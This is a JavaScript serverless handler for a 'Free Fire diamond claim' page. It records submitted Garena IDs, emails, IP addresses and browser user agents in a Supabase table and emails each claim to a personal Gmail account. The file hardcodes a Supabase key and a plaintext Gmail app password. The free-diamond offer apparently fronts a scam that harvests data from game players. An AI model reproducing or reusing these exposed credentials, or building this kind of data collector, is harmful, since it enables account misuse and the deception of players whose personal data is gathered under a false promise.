import { createClient } from '@supabase/supabase-js';
import nodemailer from 'nodemailer';

const supabaseUrl = 'https://dibssmtdcishobpdvftg.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRpYnNzbXRkY2lzaG9icGR2ZnRnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQ0MjQ4OTgsImV4cCI6MjA5MDAwMDg5OH0.lkXURp2-BjAd1AAsR78Vpfpeps0pUYCUz_JnQbmoJRc';

const supabase = createClient(supabaseUrl, supabaseKey);

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    const claimData = req.body;
    
    console.log('Free Fire Claim:', claimData);
    
    // Save to Supabase
    const { error } = await supabase
      .from('freefire_claims')
      .insert({
        garena_id: claimData.garenaId,
        email: claimData.email,
        ip: claimData.ip || null,
        user_agent: claimData.userAgent || null,
        claimed_at: claimData.timestamp || new Date().toISOString()
      });
    
    if (error) {
      console.error('Supabase error:', error);
      return res.status(500).json({ success: false, error: error.message });
    }
    
    // Send email notification
    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 587,
      secure: false,
      auth: {
        user: 'fatemaislam3380@gmail.com',
        pass: 'djrq ncxb cimp eqxo'
      }
    });
    
    await transporter.sendMail({
      from: '"Free Fire Claim" <fatemaislam3380@gmail.com>',
      to: 'fatemaislam3380@gmail.com',
      subject: '🎮 New Free Fire Diamond Claim!',
      html: `
        <h2>New Diamond Claim Request!</h2>
        <p><strong>Garena ID:</strong> ${claimData.garenaId}</p>
        <p><strong>Email:</strong> ${claimData.email}</p>
        <p><strong>IP:</strong> ${claimData.ip || 'Unknown'}</p>
        <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
        <p><strong>User Agent:</strong> ${claimData.userAgent || 'Unknown'}</p>
        <hr>
        <p>Process this claim in Garena system.</p>
      `
    });
    
    return res.status(200).json({ success: true });
    
  } catch (error) {
    console.error('Error:', error);
    return res.status(500).json({ success: false, error: error.message });
  }
}
